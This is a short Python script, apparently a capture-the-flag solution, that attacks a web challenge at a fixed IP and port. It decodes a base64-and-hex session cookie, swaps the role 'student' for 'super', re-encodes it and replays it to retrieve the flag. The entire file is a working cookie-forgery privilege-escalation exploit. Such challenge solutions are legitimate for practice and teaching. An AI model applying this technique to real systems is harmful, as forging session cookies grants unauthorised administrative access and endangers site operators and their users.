import requests
import base64
import binascii
import re
from urllib.parse import unquote

def decrypt(cipher):
	b_decode = base64.b64decode(cipher)
	hex_decode = binascii.unhexlify(b_decode).decode()
	return hex_decode

def encrypt(text):
	hex_encode = binascii.hexlify(text.encode())
	b_encode = base64.b64encode(hex_encode).decode()
	return b_encode	

def change_cookie(text, role):
	cookie = re.sub("student", role, text)
	return cookie 

url = "http://139.59.161.179:30770/question1/"

session = requests.Session()
r = requests.get(url)
cookie = unquote(r.cookies["SESSIONID"])
decrypt_cookie = decrypt(cookie)
admin_cookie_text = change_cookie(decrypt_cookie, "super")
admin_cookie = encrypt(admin_cookie_text)

cookie = {
	"SESSIONID": admin_cookie
}

r2 = requests.get(url, cookies=cookie)
answer = re.findall(r'Your flag is (.*)</div></body>', r2.text)
print(answer[0])